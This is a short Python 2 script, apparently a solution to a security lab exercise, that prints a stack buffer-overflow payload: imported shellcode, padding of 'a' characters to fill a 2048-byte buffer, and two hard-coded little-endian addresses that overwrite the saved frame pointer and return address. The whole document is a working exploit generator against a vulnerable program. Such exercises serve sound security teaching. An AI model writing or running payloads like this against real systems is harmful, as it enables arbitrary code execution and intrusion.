from shellcode import shellcode
from struct import pack
print shellcode + "a" * (2048 - 23) + pack("<I", 0xbffe94b8) + pack("<I", 0xbffe9ccc)
